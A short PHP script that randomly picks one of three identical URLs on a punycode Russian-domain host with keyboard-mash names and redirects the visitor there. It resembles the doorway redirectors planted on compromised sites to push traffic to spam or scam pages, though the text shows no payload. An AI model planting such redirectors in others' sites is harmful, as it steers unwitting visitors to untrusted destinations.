 <?php

$urls = array (

'http://zxc.dsa.qwe.xn--2018-k4dfhz7b7j.xn--p1ai/kjhg',
'http://zxc.dsa.qwe.xn--2018-k4dfhz7b7j.xn--p1ai/kjhg',
'http://zxc.dsa.qwe.xn--2018-k4dfhz7b7j.xn--p1ai/kjhg'

);
$URL = $urls[rand(0, count($urls) - 1)];
header ("Location: $URL");

?> 